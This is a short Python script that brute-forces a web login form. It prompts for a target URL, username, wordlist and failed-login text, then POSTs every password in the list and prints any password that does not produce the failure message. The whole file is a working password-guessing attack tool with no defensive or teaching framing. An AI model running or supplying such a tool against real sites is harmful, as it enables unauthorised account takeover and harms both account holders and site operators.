import requests
from termcolor import colored

url = input("[*] Enter the target url : ")
wl_file = input("[*] Enter the worlist file : ")
username = input("[*] Enter the target username : ")
login_fail = input("[*] Enter wrong password warning text : ")

def crack(url, username):
    for password in passwords:
        password = password.strip()
        print(colored(("Trying : " + password) , "red"))
        data = {"username": username, "password": password}
        res = requests.post(url, data=data)
        if login_fail in res.content.decode():
            pass
        else:
            print(colored((f"Success \n Password : {password}"), "green"))

with open(wl_file, "r") as passwords:
    crack(url,username)

print("Password Not In List ! ")